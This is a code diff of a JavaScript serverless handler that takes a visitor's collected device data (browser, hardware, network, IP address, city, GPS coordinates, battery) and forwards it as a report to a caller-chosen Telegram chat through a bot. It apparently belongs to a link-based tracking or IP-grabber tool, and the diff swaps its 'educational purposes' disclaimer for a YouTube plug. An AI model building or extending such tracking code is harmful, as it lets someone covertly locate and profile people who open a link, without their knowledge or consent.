@@ -4,59 +4,58 @@ export default async (req, res) => {
   }
 
   try {
-    const { telegramId, ...d } = req.body;
+    const { telegramId, source, ...d } = req.body;
 
-    const message = `**🔰 Device Information Report 🔰**\n\n` +
-      `🌐 **Basic Info:**\n` +
-      `- Browser: ${d.browser}\n` +
-      `- Platform: ${d.platform}\n` +
-      `- Language: ${d.language}\n` +
-      `- Timezone: ${d.timezone}\n\n` +
+    // Helper to escape Markdown special characters
+    const escapeMarkdown = (text = '') => {
+      return text.replace(/([_*[\]()~`>#+-=|{}.!])/g, '\\$1');
+    };
 
-      `💻 **Hardware:**\n` +
-      `- CPU: ${d.cpu}\n` +
-      `- RAM: ${d.ram}\n` +
-      `- Screen: ${d.screen}\n` +
-      `- WebGL: ${d.webgl}\n\n` +
+    const message = `*Device Info*\n\n` +
+      `🌐 *Basic Info:*\n` +
+      `- Browser: ${escapeMarkdown(d.browser)}\n` +
+      `- Platform: ${escapeMarkdown(d.platform)}\n` +
+      `- Language: ${escapeMarkdown(d.language)}\n` +
+      `- Timezone: ${escapeMarkdown(d.timezone)}\n\n` +
 
-      `📶 **Network:**\n` +
-      `- Type: ${d.networkType}\n` +
-      `- Speed: ${d.networkSpeed}\n` +
-      `- Latency: ${d.latency}\n` +
-      `- Data Saver: ${d.dataSaver}\n` +
-      `- ISP: ${d.location.isp}\n\n` +
+      `💻 *Hardware:*\n` +
+      `- CPU: ${escapeMarkdown(d.cpu)}\n` +
+      `- RAM: ${escapeMarkdown(d.ram)}\n` +
+      `- Screen: ${escapeMarkdown(d.screen)}\n` +
+      `- WebGL: ${escapeMarkdown(d.webgl)}\n\n` +
 
-      `📍 **IP Info:**\n` +
-      `- IP: ${d.ip}\n` +
-      `- City: ${d.location.city}\n` +
-      `- Region: ${d.location.region}\n` +
-      `- Country: ${d.location.country}\n` +
-      `- GPS: ${d.gps}\n\n` +
+      `📶 *Network:*\n` +
+      `- Type: ${escapeMarkdown(d.networkType)}\n` +
+      `- Speed: ${escapeMarkdown(d.networkSpeed)}\n` +
+      `- Latency: ${escapeMarkdown(d.latency)}\n` +
+      `- Data Saver: ${escapeMarkdown(d.dataSaver)}\n` +
+      `- ISP: ${escapeMarkdown(d.location?.isp)}\n\n` +
+
+      `📍 *IP Info:*\n` +
+      `- IP: ${escapeMarkdown(d.ip)}\n` +
+      `- City: ${escapeMarkdown(d.location?.city)}\n` +
+      `- Region: ${escapeMarkdown(d.location?.region)}\n` +
+      `- Country: ${escapeMarkdown(d.location?.country)}\n` +
+      `- GPS: ${escapeMarkdown(d.gps)}\n` +
+      `- Source: ${escapeMarkdown(source)}\n\n` +
       `_Note: IP-based location may not be accurate._\n\n` +
 
-      `🔋 **Battery:**\n` +
-      `- Level: ${d.batteryLevel}\n` +
-      `- Charging: ${d.charging}\n\n` +
+      `🔋 *Battery:*\n` +
+      `- Level: ${escapeMarkdown(d.batteryLevel)}\n` +
+      `- Charging: ${escapeMarkdown(d.charging)}\n\n` +
 
-      `⚠️ **Disclaimer:** This data is collected for educational and research purposes only. Accuracy is not guaranteed.`;
+      `_Subscribe to my YT_`;
 
     // Send message to Telegram
-    const response = await fetch(
-      `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
-      {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: telegramId,
-          text: message,
-          parse_mode: 'Markdown'
-        })
-      }
-    );
-
-    if (!response.ok) {
-      throw new Error('Failed to send message to Telegram');
-    }
+    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: telegramId,
+        text: message,
+        parse_mode: 'MarkdownV2' // safer than Markdown
+      })
+    });
 
     res.status(200).json({ success: true });
   } catch (error) {
